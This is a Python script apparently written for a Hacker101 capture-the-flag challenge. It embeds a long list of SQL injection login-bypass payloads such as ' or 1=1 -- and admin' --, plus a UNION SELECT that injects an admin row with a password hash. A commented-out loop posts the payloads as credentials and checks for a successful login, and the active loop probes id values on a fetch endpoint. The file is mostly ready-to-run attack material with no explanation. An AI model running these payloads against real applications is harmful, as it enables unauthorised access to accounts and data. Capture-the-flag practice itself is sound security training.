import requests
import random
import time

url = 'https://2926239bdfb91937f9145513cdc5da9c.ctf.hacker101.com/fetch?id='

data = """'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
"""
# data = data.split('\n')
# size = len(data)
# for i in range(size):
#     j = random.randint(0, size)
#     j = j if j < size else 0
#     content = {"username": data[i],"password": data[j]}
#     res = requests.post(url, data=content)

#     if res.status_code == 200 and "Unknown user" not in res.text and "Invalid password" not in res.text and "red" not in res.text:
#         print(data[i]+"******** *********" + data[j])
#         print(res.text)
#         break
#     if res.status_code > 499 :
#         print("Internal Server Error " + data[j] + " , " +data[i])
#         print(res.text)
#         break


for j in range(4,100):
    # content = {"username": data[i],"password": data[j]}
    # res = requests.get(url+str, data=content)
    res = requests.get(url+str(j))
    # print(res.text)
    time.sleep(1)
    if res.status_code == 200 :
        print( " //// " + str(j), end='\n\n\n')
        # print(res.text)
        # break
    if res.status_code > 499 :
        # print("Internal Server Error " + data[j] + " , " +data[i])
        print("Internal server error : "+str(j), end='\n\n')
        # print(res.text)
        break
